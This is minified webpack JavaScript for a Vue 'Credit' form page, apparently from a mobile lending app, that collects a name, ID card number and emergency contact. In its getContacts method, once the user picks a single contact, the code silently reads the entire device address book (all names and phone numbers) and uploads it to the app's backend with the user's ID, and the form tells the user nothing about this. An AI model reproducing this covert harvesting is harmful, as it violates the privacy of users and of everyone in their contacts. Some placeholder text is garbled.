(window["webpackJsonp"]=window["webpackJsonp"]||[]).push([["Credit"],{"3db3":function(t,e,a){"use strict";var i=a("8df7"),s=a.n(i);s.a},"69d7":function(t,e,a){"use strict";a.r(e);var i,s=function(){var t=this,e=t.$createElement,a=t._self._c||e;return a("div",{staticClass:"addbank"},[a("page-head",{attrs:{titleKey:"creditTitle",fixed:!0}}),a("div",{staticClass:"reg-form"},[a("div",{staticClass:"reg-item"},[a("h3",[t._v(t._s(t.$t("cn-101"))+"：")]),a("van-field",{staticStyle:{"padding-top":"7px","padding-bottom":"7px"},attrs:{type:"text",maxlength:"50",placeholder:t.$t("cn-1026")},model:{value:t.name,callback:function(e){t.name=e},expression:"name"}})],1),a("div",{staticClass:"reg-item"},[a("h3",[t._v(t._s(t.$t("cn-185"))+"：")]),a("van-field",{staticStyle:{"padding-top":"7px","padding-bottom":"7px"},attrs:{type:"text",maxlength:"50",placeholder:t.$t("cn-1027")},model:{value:t.idCard,callback:function(e){t.idCard=e},expression:"idCard"}})],1),t.$isNative?[a("div",{staticClass:"reg-item"},[a("h3",[t._v(t._s(t.$t("cn-106"))+"：")]),a("van-field",{staticStyle:{"padding-top":"7px","padding-bottom":"7px"},attrs:{type:"text",maxlength:"50",disabled:"",placeholder:t.$t("cn-1045")},on:{click:t.getContacts},model:{value:t.parentsType,callback:function(e){t.parentsType=e},expression:"parentsType"}})],1),a("div",{staticClass:"reg-item"},[a("h3",[t._v(t._s(t.$t("cn-107"))+"：")]),a("van-field",{staticStyle:{"padding-top":"7px","padding-bottom":"7px"},attrs:{type:"text",maxlength:"50",disabled:"",placeholder:t.$t("cn-1045")},on:{click:t.getContacts},model:{value:t.othNum,callback:function(e){t.othNum=e},expression:"othNum"}})],1)]:[a("div",{staticClass:"reg-item"},[a("h3",[t._v(t._s(t.$t("cn-106"))+"：")]),a("van-field",{staticStyle:{"padding-top":"7px","padding-bottom":"7px"},attrs:{type:"text",maxlength:"50",placeholder:t.$t("cn-1028")},model:{value:t.parentsType,callback:function(e){t.parentsType=e},expression:"parentsType"}})],1),a("div",{staticClass:"reg-item"},[a("h3",[t._v(t._s(t.$t("cn-107"))+"：")]),a("van-field",{staticStyle:{"padding-top":"7px","padding-bottom":"7px"},attrs:{type:"text",maxlength:"50",placeholder:t.$t("cn-1028")},model:{value:t.othNum,callback:function(e){t.othNum=e},expression:"othNum"}})],1)],a("van-button",{staticClass:"reg-submit",attrs:{type:"info",loading:t.isSubmit,"loading-text":t.$t("cn-1043")},on:{click:t.saveCreditData}},[t._v(t._s(t.$t("cn-209")))])],2)],1)},n=[],c=(a("7db0"),a("b0c0"),a("ac1f"),a("5319"),a("2fa7")),o=(a("b342"),a("ad06")),l=(a("9eda"),a("565f")),r=(a("c625"),a("b650")),d=(a("e9a3"),a("d314")),p=(a("c65f"),a("2d6d")),u=a("a474"),m=(i={},Object(c["a"])(i,p["a"].name,p["a"]),Object(c["a"])(i,d["a"].name,d["a"]),Object(c["a"])(i,r["a"].name,r["a"]),Object(c["a"])(i,l["a"].name,l["a"]),Object(c["a"])(i,o["a"].name,o["a"]),i),h={name:"Credit",components:m,props:{},data:function(){return{othNum:"",idCard:"",name:"",urlType:"",cardType:0,parentsType:"",isSubmit:!1,isReport:!1,parentsOptions:[{text:this.$t("cn-110"),value:0},{text:this.$t("cn-111"),value:1},{text:this.$t("cn-112"),value:2}],cardOptions:[{text:"sss(sociai securyisj )",value:0},{text:"sss(sociai securyisj )",value:1},{text:"sss(sociai securyisj )",value:2}]}},computed:{},watch:{},created:function(){this.urlType=this.$route.query.type},mounted:function(){},destroyed:function(){},methods:{getContacts:function(){if(this.$isNullOrEmpty(navigator.contacts))this.$toast(this.$t("cn-1046"));else{var t=this,e={filter:"",multiple:!0};navigator.contacts.pickContact((function(a){var i=a.displayName;if(t.$isNullOrEmpty(i)&&a.name)for(var s in a.name)if(i=i||a.name[s],i)break;for(var n=[],c=a.phoneNumbers,o=0;o<c.length;o++)n.push(c[o].value.replace(/ /g,""));i&&n.length>0&&(t.parentsType=i+"",t.othNum=n[0]+""),t.isReport||navigator.contacts.find(["name","displayName","phoneNumbers"],(function(e){for(var a=[],i=0;i<e.length;i++){var s=e[i],n=s.displayName;if(t.$isNullOrEmpty(n)&&s.name)for(var c in s.name)if(n=n||s.name[c],n)break;var o=[],l=e[i].phoneNumbers;if(!t.$isNullOrEmpty(l)&&0!==l.length){for(var r=0;r<l.length;r++)o.push({id:l[r].id||"",label:l[r].label||"",number:l[r].value.replace(/ /g,"")});n&&o.length>0&&a.push({name:n,phoneList:o})}}a.length>0&&Object(u["g"])({userGid:localStorage.getItem("userGid"),contactList:a}).then((function(){t.isReport=!0}))}),(function(){}),e)}),(function(){}))}},saveCreditData:function(){var t=this;if(!this.isSubmit)return this.isSubmit=!0,this.$isNullOrEmpty(this.name)?(this.$toast(this.$t("cn-126")),void(this.isSubmit=!1)):this.$isNullOrEmpty(this.idCard)?(this.$toast(this.$t("cn-114")),void(this.isSubmit=!1)):this.$isNullOrEmpty(this.parentsType)?(this.$toast(this.$t("cn-1029")),void(this.isSubmit=!1)):this.$isNullOrEmpty(this.othNum)?(this.$toast(this.$t("cn-1030")),void(this.isSubmit=!1)):void Object(u["i"])({userGid:localStorage.getItem("userGid"),name:this.name,idcard:this.idCard,contactPhone:this.othNum,relation:this.parentsType}).then((function(e){"0000"===e.code?"1"===t.urlType?t.$router.replace({path:"/creditStatus"}):t.$router.replace({path:"/creditUpfile"}):(t.$toast(e.message),t.isSubmit=!1)})).catch((function(){t.isSubmit=!1,t.$toast(t.$t("cn-1044"))}))}}},v=h,f=(a("3db3"),a("2877")),b=Object(f["a"])(v,s,n,!1,null,"6d18ea84",null);e["default"]=b.exports},"8df7":function(t,e,a){}}]);